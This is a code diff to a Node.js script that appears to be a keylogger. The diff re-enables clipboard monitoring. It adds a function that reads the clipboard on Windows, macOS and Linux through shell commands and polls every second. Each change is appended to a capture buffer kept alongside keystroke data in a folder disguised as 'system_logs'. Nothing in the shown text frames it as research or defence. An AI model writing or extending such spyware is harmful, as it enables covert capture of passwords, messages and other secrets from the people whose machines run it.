@@ -3,7 +3,7 @@ try {
     const os = require('os');
     const path = require('path');
     const fs = require('fs');
-    //const clipboardy = require('clipboardy');
+    const { execSync } = require('child_process');
 
     const homeDir = os.homedir(); // e.g., C:\Users\<YourUsername>
     const logPath = path.join(homeDir, 'AppData', 'Local', 'system_logs');
@@ -11,19 +11,36 @@ try {
     let GlobalKeyboardListener;
     let v;
     let rawBuffer = `\n\n*********************************        ${new Date()}       ********************************\n\n`;
-
-    /*
     let lastClipboardContent = '';
 
+    function getClipboardText() {
+        try {
+            const platform = os.platform();
+            let text;
+            if (platform === 'win32') {
+                text = execSync('powershell -command "Get-Clipboard"').toString().trim();
+            } else if (platform === 'darwin') {
+                text = execSync('pbpaste').toString().trim();
+            } else if (platform === 'linux') {
+                text = execSync('xclip -selection clipboard -o').toString().trim();
+            } else {
+                throw new Error('Unsupported OS');
+            }
+            return text;
+        } catch (err) {
+            console.error('Failed to read clipboard:', err);
+            return null;
+        }
+    }
+
     setInterval(() => {
-        const currentContent = clipboardy.readSync();
+        const currentContent = getClipboardText();
         if (currentContent !== lastClipboardContent) {
             //console.log('Clipboard changed:', currentContent);
-            rawBuffer += 'Clip: -------->>>>>>'+currentContent+'\n';
+            rawBuffer += '\n--------------------------------------------------------------------------------->>>>>>Clip:'+currentContent+'\n';
             lastClipboardContent = currentContent;
         }
     }, 1000); // check every second
-    */
 
 
     // Try to require the jsonpacks module
